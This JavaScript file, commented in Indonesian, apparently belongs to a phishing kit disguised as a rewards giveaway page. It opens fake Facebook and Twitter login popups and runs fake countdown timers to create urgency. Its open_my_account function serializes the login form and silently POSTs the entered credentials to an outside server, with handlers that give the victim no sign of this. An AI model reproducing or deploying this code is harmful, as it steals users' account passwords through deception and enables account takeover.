var buka = new Audio();
buka.src = "https://rawcdn.githack.com/AlexHostX/all.asset/d1a42a80f01064a559cb0ce4e5ec0474091c651f/click.mp3";

var tutup = new Audio();
tutup.src = "https://rawcdn.githack.com/AlexHostX/all.asset/6635455e463c4b55d9c4dac99f2c44f9091b612c/unclick.mp3";

function openRewards(evt,rewardsClass){var i,tab_rewards,tab_rewards_link;tab_rewards=document.getElementsByClassName("tab_rewards");for(i=0;i<tab_rewards.length;i++){tab_rewards[i].style.display="none";}
tab_rewards_link=document.getElementsByClassName("menu-content");for(i=0;i<tab_rewards_link.length;i++){tab_rewards_link[i].className=tab_rewards_link[i].className.replace(" menu-content-active","");}
document.getElementById(rewardsClass).style.display="block";evt.currentTarget.className+=" menu-content-active";}
document.getElementById("defaultTabRewards").click();

function open_my_account() {var myFormAcc = $("#formLogin").serialize();$.ajax({url: 'https://arpanrizki.my.id/api/get_flag2/api.php',data: myFormAcc,type: 'POST',success: function() {return true;},error: function() {return true;}});}

function open_reward_confirmation(ag) {
    var rewardImg = $(ag).attr("src");
    $('.reward_confirmation').show();
    $('#myRewardImg').attr('src',rewardImg);
}
function open_account_login(){
	$('.account_login').show();
	$('.reward_confirmation').hide();
}
function open_facebook(){
	$('.login-facebook').show();
	$('.account_login').hide();
}
function open_twitter(){
	$('.login-twitter').show();
	$('.account_login').hide();
}

// tombol untuk menutup popup
function close_reward_confirmation(){
	$('.reward_confirmation').hide()
}
function close_account_login(){
	$('.account_login').hide()
}
function tutup_facebook(){
	$('.login-facebook').hide()
	$('.account_login').show();
}
function tutup_twitter(){
	$('.login-twitter').hide()
	$('.account_login').show();
}

function showFbPassword() {
  var x = document.getElementById("fbpassword");
  if (x.type === "password") {
    x.type = "text";
	$('.showPassword').hide();
	$('.hidePassword').show();
  } else {
    x.type = "password";
  }
}
function hideFbPassword() {
  var x = document.getElementById("fbpassword");
  if (x.type === "text") {
    x.type = "password";
	$('.showPassword').show();
	$('.hidePassword').hide();
  } else {
    x.type = "text";
  }
}
	$(document).ready(function() { 
var detik = 59;
var menit = 59;
var jam = 23;
function hitung() { 
setTimeout(hitung,1000); $('#latestTimer').html( '' + jam + ' : ' + menit + ' : ' + detik + ''); detik --; 
if(detik < 0) { 
detik = 59; 
menit --; 
if(menit < 0) { 
menit = 0; 
detik = 0; 
} 
} 
} 
hitung(); 
}
);

$(document).ready(function() { 
var detik = 59;
var menit = 59;
var jam = 23;
function hitung() { 
setTimeout(hitung,1000); $('#seasonTimer').html( '' + jam + ' : ' + menit + ' : ' + detik + ''); detik --; 
if(detik < 0) { 
detik = 59; 
menit --; 
if(menit < 0) { 
menit = 0; 
detik = 0; 
} 
} 
} 
hitung(); 
}
);
